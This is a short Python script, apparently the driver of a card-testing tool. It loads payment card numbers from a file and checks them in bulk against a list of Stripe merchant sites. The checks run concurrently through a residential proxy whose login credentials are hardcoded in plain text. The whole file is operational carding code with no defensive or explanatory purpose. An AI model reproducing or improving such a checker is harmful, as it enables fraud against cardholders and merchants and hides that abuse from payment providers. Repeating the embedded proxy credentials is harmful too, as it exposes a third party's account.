import asyncio
from utils.helper import read_file_generator
from controller.cyber_flex import cyber_flex_check


async def run_checks(cards, sites, proxy, max_concurrent: int = 500):
    sem = asyncio.Semaphore(max_concurrent)

    async def wrapped_checker(card, site):
        async with sem:
            try:
                await asyncio.shield(cyber_flex_check(card, site, proxy))
            except Exception as e:
                print(f"[LOGS] Error with {card} @ {site}: {e}")

    async with asyncio.TaskGroup() as tg:
        for i, card in enumerate(cards):
            site = sites[i % len(sites)]  # round-robin assignment
            tg.create_task(wrapped_checker(card, site))

    print("[LOGS] All checks finished!")


if __name__ == "__main__":
    cards = list(read_file_generator("cards.txt"))
    stripe_sites = list(read_file_generator(
        "data/files/site/cyber_flex_sites.txt"))

    proxy = "http://yoytrades_gmail_com:Onedirection12@la.residential.rayobyte.com:8000"
    print(f"cards: {len(cards)}")
    print(f"sites: {len(stripe_sites)}")

    asyncio.run(run_checks(cards, stripe_sites, proxy, max_concurrent=13))
